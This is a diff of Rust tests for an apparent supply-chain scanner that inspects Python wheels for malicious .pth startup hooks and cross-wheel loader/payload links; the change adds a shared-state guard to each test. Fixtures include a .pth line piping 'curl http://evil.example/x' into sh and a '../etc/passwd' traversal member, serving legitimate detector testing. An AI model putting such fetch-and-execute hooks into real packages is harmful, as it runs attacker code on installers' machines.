@@ -1083,6 +1083,7 @@ mod tests {
 
     #[test]
     fn clean_wheel_inspects_to_no_findings() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let bytes = build_wheel(&[
             ("demo/__init__.py", b"print('hi')\n"),
@@ -1117,6 +1118,7 @@ mod tests {
 
     #[test]
     fn unsupported_sdist_is_unsupported_error() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         // gzip magic, named .tar.gz
         let path = write_temp(&dir, "demo-1.0.tar.gz", &[0x1f, 0x8b, 0x08, 0x00, 0, 0]);
@@ -1127,6 +1129,7 @@ mod tests {
 
     #[test]
     fn missing_file_is_unreadable() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("nope-1.0-py3-none-any.whl");
         let err = inspect_artifact_file(&path).unwrap_err();
@@ -1135,6 +1138,7 @@ mod tests {
 
     #[test]
     fn artifact_set_cross_distribution_loads_payload() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Wheel A (the LOADER) bundles a `.pth` that searches sys.path and executes,
         // and NAMES wheel B's payload member by its installed path. Wheel B (the
         // PAYLOAD) owns that script member. The set inspection must produce exactly
@@ -1196,6 +1200,7 @@ mod tests {
 
     #[test]
     fn artifact_set_two_benign_wheels_no_cross_finding() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Two independent benign wheels (no sys.path-searching loader) produce no
         // cross-distribution finding.
         let dir = tempfile::tempdir().unwrap();
@@ -1227,6 +1232,7 @@ mod tests {
 
     #[test]
     fn artifact_set_unrelated_payload_in_other_wheel_no_cross_finding() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // PR-I: real ownership resolution. The loader has an executing,
         // sys.path-searching startup hook, but it references its OWN sibling module
         // path ('loaderpkg/local.py'), NOT anything wheel B owns. Wheel B carries an
@@ -1274,6 +1280,7 @@ mod tests {
 
     #[test]
     fn artifact_set_reference_resolves_only_to_named_owner() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // PR-I: a loader reference resolves only to the ACTUAL owner. The loader
         // names a payload by its installed path; wheel B owns exactly that path and
         // wheel C owns a DIFFERENT, unreferenced payload member. The cross finding
@@ -1353,6 +1360,7 @@ mod tests {
 
     #[test]
     fn wheel_with_executable_pth_fires_suspicious() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         // A .pth that executes a subprocess at startup (the B6 case).
         let pth = b"import os; os.system('curl http://evil.example/x | sh')\n";
@@ -1390,6 +1398,7 @@ mod tests {
     /// reopens that a swap could split apart.
     #[test]
     fn inspect_artifact_file_uses_one_handle() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use sha2::{Digest, Sha256};
         let dir = tempfile::tempdir().unwrap();
         let bytes = build_wheel(&[
@@ -1430,6 +1439,7 @@ mod tests {
     /// and a hard Block.
     #[test]
     fn cross_distribution_cross_runtime_still_critical() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let dir = tempfile::tempdir().unwrap();
         // Loader `.pth`: searches sys.path AND launches node (cross-runtime) on a
         // script member OWNED by the payload wheel (`payloadpkg/run.sh`), so the
@@ -1486,6 +1496,7 @@ mod tests {
     /// cross finding at all; see `artifact_set_unrelated_payload_in_other_wheel_*`).
     #[test]
     fn cross_distribution_non_cross_runtime_resolved_reference_is_block() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use crate::verdict::{action_from_findings, Action, Severity};
         let dir = tempfile::tempdir().unwrap();
         // Loader `.pth`: searches sys.path AND executes a subprocess on a script
@@ -1562,6 +1573,7 @@ mod tests {
     /// (it would be collapsed and MISSED if identity keyed on the bare filename).
     #[test]
     fn same_distribution_distinguishes_identical_names_in_different_dirs() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let base = tempfile::tempdir().unwrap();
         let dir_a = base.path().join("a");
         let dir_b = base.path().join("b");
@@ -1653,6 +1665,7 @@ mod tests {
 
     #[test]
     fn malformed_buffered_native_member_becomes_typed_incomplete_finding() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use crate::verdict::{action_from_findings, Action, RuleId};
 
         let dir = tempfile::tempdir().unwrap();
@@ -1687,6 +1700,7 @@ mod tests {
 
     #[test]
     fn unsupported_set_member_is_not_an_empty_allow() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use crate::verdict::{action_from_findings, Action, RuleId};
 
         let dir = tempfile::tempdir().unwrap();
@@ -1707,6 +1721,7 @@ mod tests {
     /// on a structurally-rejected wheel by construction.
     #[test]
     fn all_findings_synthesizes_structural_rejection_for_rejected_member() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use crate::verdict::{action_from_findings, Action, RuleId};
 
         // A wheel with a `../etc/passwd` member is structurally REJECTED by read_wheel.
